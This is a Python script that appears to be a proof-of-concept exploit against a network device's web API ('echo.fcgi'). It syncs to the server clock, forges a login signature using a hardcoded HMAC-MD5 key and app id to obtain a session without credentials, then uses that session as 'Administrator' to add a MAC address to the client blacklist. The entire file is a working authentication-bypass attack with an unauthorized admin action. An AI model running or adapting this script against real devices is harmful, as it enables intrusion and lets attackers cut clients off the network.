import requests
import time
import hmac
import hashlib
import urllib3  
urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)
import json
from datetime import datetime

# CHANGE THIS TO WEB INTERFACE ADDRESS
base = "https://localhost:443"

def generate_signature(timestamp, key):
    message = str(timestamp).encode('utf-8')
    key = key.encode('utf-8')
    signature = hmac.new(key, message, hashlib.md5).hexdigest().upper()
    return signature

#######################
# CALCULATE TIMESTAMP #
#######################
response = requests.get(base, verify=False)
print(f"Status Code: {response.status_code}")
for key, items in response.headers.items():
    if key == "Date":
        server_date = items
        break
server_time = int(datetime.strptime(server_date, "%a, %d %b %Y %X %Z").strftime("%s"))
timestamp = int(time.time())
offset = server_time - timestamp + 28800

print(f"Server Time: {server_time}")
print(f"Local Time: {timestamp}")
print(f"Time Discrepency: {offset}")
print("====")

##########################
# GENERATE VALID SESSION #
##########################
url = f"{base}/echo.fcgi/api/login"
# Generate timestamp and signature
timestamp = int(time.time()) + offset
key = "hyadasdfasdf32eb"
signature = generate_signature(timestamp, key)

headers = {
    "X-API-App-Id": "hyapiinterface",
    "X-API-Timestamp": str(timestamp),
    "X-API-Signature": signature
}

response = requests.post(url, headers=headers, json={}, verify=False)

print(f"Sent headers:\nX-API-App-Id : { headers['X-API-App-Id'] }\nX-API-Timestamp : { headers['X-API-Timestamp'] }\nX-API-Signature : { headers['X-API-Signature'] }")
print(f"Status Code: {response.status_code}")
print("Response Body:")
print(response.text)

res = json.loads(response.text)
print(f"sessionId : {res['result']['sessionId']}")

print("====")

################
# SEND REQUEST #
################
headers2 = {
    "Host": "localhost",
    "Content-Length": "325",
    "Sec-Ch-Ua": '"Not;A=Brand";v="99", "Chromium";v="106"',
    "Accept": "application/json, text/plain, */*",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept-Language": "en-GB",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36",
    "Content-Type": "application/json",
    "Origin": "https://localhost",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://localhost/static/main.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i",
    "Connection": "keep-alive"
}

data_addBL = {
    "id":30,
    "jsonrpc":"2.0",
    "method":"expressmessage.call",
    "username":"Administrator",
    "session":f"{res['result']['sessionId']}",
    "topic":"WMA/TEST",
    "params": {
        "version":"3.0",
        "messageID":30,
        "macAddress":"DC:08:56:B4:95:E0",
        "option":"update",
        "method":"blacklist.setClientBlacklist",
        "contents": {
            "addlist":["DE:AD:BE:EF:10:01"]
            }
        }
    }

url2 = f"{base}/echo.fcgi"

response = requests.post(url2, headers=headers2, json=data_addBL, verify=False)

print(f"Sent data:\nsession: {data_addBL['session']}\nmethod: {data_addBL['method']}")
print(f"Status Code: {response.status_code}")
print("Response Body:")
print(response.text)
